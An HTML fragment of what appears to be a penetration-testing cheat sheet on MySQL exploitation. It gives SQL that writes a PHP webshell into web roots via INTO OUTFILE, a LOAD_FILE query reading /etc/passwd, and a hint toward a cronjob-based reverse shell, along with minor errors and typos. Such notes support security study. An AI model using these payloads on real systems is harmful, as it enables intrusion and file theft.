            <h2>Usage</h2>
            <h3>Connect to DB</h3>
            <ul>
                <p> You must have impacket suit installed (/examples directory)</p>
                <pre><code class="language-bash">mysql -u root -h 10.129.14.132 -p</code></pre>
                <p>In case you see an error like <b>"ERROR 2026 (HY000): TLS/SSL error: self-signed certificate in certificate chain"</b> just use <b>--skip-ssl</b></p>
            </ul>

            <h2>Exploitation</h2>
            <ul>
                <h3>Command execution</h3>
                <ul>
                    <p>We can achieve command execution if we write to a location in the file system that can execute our commands</p>
                    <p>These operations are permitted only to users who have the FILE privilege. secure_file_priv may be set as follows:
                    <ul>
                        <li>If empty, the variable has no effect, which is not a secure setting.</li>
                        <li>If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.</li>
                        <li>If set to NULL, the server disables import and export operations.</p></li>
                    </ul>
                    <p>Use the following command to check how the variable is set</p>
                    <pre><code class="language-sql">show variables like "secure_file_priv";</code></pre>
                    <p>In case it's empty or it is located only in a specific folder we can try to perform</p>
                    <b>Linux</b>
                    
                    <pre><code class="language-sql">SELECT "&lt;?php echo shell_exec($_GET['c']);?&gt;" INTO OUTFILE '/var/www/html/webshell.php';</code></pre>
                    <b>Windows</b>
                    <p>Rmember that there is no \ in case you would like to use them you could do \\</p>
                    <pre><code class="language-sql">SELECT "&lt;?php echo shell_exec($_GET['c']);?&gt;" INTO OUTFILE 'C:/xampp/htdocs/dashboard/mytest.php';</code></pre>
                    <p>From here you should try to locate some cronjob and attempt to write a simple file in order to get executed by a user inside a machine. Then you'll get a reverse shell</p>
                </ul>
                <h3>File read</h3>
                <p>In case you have the READ permissions you are able to read system files by doing</p>
                <pre><code class="language-sql">select LOAD_FILE("/etc/passwd");</code></pre>
            </ul>
